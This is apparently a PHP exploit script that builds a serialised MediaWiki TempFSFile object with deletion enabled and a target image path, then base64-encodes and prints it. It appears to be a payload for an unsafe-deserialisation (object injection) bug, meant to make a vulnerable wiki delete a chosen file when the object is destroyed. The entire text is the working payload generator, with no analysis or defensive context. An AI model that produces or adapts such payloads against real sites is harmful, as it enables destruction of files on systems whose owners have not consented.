<?php
namespace Wikimedia\FileBackend\FSFile;

class FSFile {
	public $path;
}

class TempFSFile extends FSFile {
	public $canDelete;
}

$file = new TempFSFile();
$file->canDelete = true;
$file->path = "/var/www/html/images/thumb/f/fc/Trampolin.png/500px-Trampolin.png";

$payload = base64_encode(serialize($file));
echo $payload;
?>
